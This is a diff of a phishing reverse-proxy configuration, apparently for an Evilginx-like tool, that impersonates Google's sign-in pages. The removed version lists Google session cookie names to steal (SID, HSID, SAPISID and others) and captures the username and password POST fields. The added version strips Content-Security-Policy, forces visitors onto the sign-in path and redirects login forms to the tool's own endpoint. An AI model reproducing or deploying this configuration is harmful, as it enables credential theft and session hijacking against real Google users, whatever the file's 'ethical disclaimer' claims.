@@ -1,24 +1,20 @@
-# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
-min_ver: '3.0.0'
+name: "Google-Accounts"
+author: "Vanta v5"
+min_ver: "5.0.0"
 proxy_hosts:
-  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
-  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false}
-sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com/SignOutOptions', replace: 'https://{hostname}/SignOutOptions', mimes: ['text/html', 'application/javascript']}
-auth_tokens:
-  - domain: '.google.com'
-    keys: ['SID', 'HSID', 'SAPISID', 'SSID', 'APISID', 'LSID']
-  - domain: 'accounts.google.com'
-    keys: ['GAPS', 'LSID', 'ACCOUNT_CHOOSER']
-credentials:
-  username:
-    key: 'identifier'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'accounts.google.com'
-  path: '/ServiceLogin'
+  - subdomain: "accounts"
+    target: "accounts.google.com"
+auth_urls: ["/signin/v2/identifier", "/ServiceLogin"]
+landing_path: ["/signin/v2/identifier"]
+auth_tokens: []
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/signin/v2/identifier", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|gtm|/static/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*=\"ServiceLogin\"], form[action*=\"signin\"]", action_to: "/session/login"}
